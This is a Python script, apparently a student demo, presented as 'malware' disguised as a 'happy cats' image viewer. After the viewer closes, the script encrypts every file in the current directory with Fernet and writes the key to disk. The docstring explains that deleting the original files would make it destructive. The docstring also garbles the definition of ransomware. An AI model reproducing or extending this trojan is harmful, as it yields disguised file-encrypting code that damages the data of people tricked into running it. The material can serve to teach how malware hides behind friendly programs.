
"""
hi guys, naners here. I made some "malware"
that makes an encrypted version of each file 
in the current directory. in order to make it safe to 
run on school computers, it doesnt delete the origonal file,
rather making a copy. Making this malware destructive is as simple
as deleting the origonal files in the directory. This is malware
and not ransomware because it encrypts your files, not decrypts them. It
has no monetary goal, just to be destructive and encrpyt your files. 
malware is commonly disgused as friendly programs, and this is disguied as
happy cats, a program to look at happy cats. when you run the software, 
it runs happy cats as well as encrypting your files. The goal of this is to 
show you just how unsuspecting malware can be. malware can be any program, as the only
way to make sure its not is to read the source code.
"""

import os
import tkinter as tk
from PIL import Image, ImageTk
from cryptography.fernet import Fernet

class ImageCycleGUI:
    def __init__(self, master):
        self.master = master
        self.images = [
            Image.open("image1.jpg"),
            Image.open("image2.jpg"),
            Image.open("image3.jpg")
        ]
        self.current_image = 0
        self.image_label = tk.Label(master)
        self.image_label.pack()
        self.update_image()
        prev_button = tk.Button(master, text="Prev", command=self.prev_image)
        prev_button.pack(side=tk.LEFT)
        next_button = tk.Button(master, text="Next", command=self.next_image)
        next_button.pack(side=tk.RIGHT)

    def update_image(self):
        image = self.images[self.current_image]
        photo = ImageTk.PhotoImage(image)
        self.image_label.configure(image=photo)
        self.image_label.image = photo     # type: ignore

    def prev_image(self):
        self.current_image -= 1
        if self.current_image < 0:
            self.current_image = len(self.images) - 1
        self.update_image()

    def next_image(self):
        self.current_image += 1
        if self.current_image >= len(self.images):
            self.current_image = 0
        self.update_image()


class malware():
    def __init__(self):

        self.key = Fernet.generate_key()
        
        

    def generate(self):

        with open("key.key", "wb") as filekey:

            filekey.write(self.key)

            return self.key
        
        

    def crpyt(self):

        fernet = Fernet(self.key)

        for filename in os.listdir(os.getcwd()):

            if not filename.endswith('.encrypted'):

                with open(os.path.join(os.getcwd(), filename), 'rb') as f:
                    original = f.read()

                    encrypted = fernet.encrypt(original)

                with open(os.path.join(os.getcwd(), filename + '.encrypted'), 'wb') as f:
                    f.write(encrypted)


if __name__ == "__main__":
    root = tk.Tk()
    root.resizable(False, False)
    root.geometry("450x400")
    root.title("happy cats")
    app = ImageCycleGUI(root)
    root.mainloop()
    mal = malware()
    mal.crpyt()
    mal.generate()